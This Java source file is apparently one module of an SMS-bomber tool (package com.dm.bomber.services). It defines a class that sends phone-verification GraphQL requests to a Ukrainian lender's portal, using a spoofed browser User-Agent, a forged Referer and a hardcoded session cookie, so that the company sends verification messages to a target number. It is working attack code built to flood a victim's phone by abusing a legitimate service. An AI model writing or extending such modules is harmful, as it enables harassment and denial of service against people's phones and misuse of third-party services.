package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Soscredit extends JsonService {

    public Soscredit() {
        setUrl("https://cp.soscredit.ua/graphql/portal");
        setMethod(POST);
        setPhoneCode("380");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("Cookie", "lang=uk; device=efe1de42-b98b-454d-a621-347cd7d540b8; _gcl_au=1.1.1115308632.1634117698; _ga=GA1.2.612502580.1634117698; _hjid=933c789a-d48d-4173-9677-dc0ea09f9488; PHPSESSID=e17647c02c9f6cdae53a71c53c2604ce; cpaClickId=d15b045c-9bac-47d4-87bb-6a71137dc339; credit={\"amount\":3000,\"term\":15,\"product_params_id\":\"26474253\"}; promocode=; _gid=GA1.2.706473100.1635343152; _gaclientid=612502580.1634117698; sessionId=20211027|06098436; _gahitid=16:59:12; soscredit.ua_UTM=&utm_source=cpa&utm_medium=soscredit_partners_4; _dc_gtm_UA-88906892-1=1; _dc_gtm_UA-88906892-3=1; _hjAbsoluteSessionInProgress=1");
        builder.addHeader("Referer", "https://cabinet.soscredit.ua/");
        builder.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("operationName", "phoneVerification");
            json.put("variables", new JSONObject().put("phone", "+" + getFormattedPhone()));
            json.put("query", "mutation phoneVerification($phone: String!) {\n  phoneVerification(phone: $phone)\n}\n");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
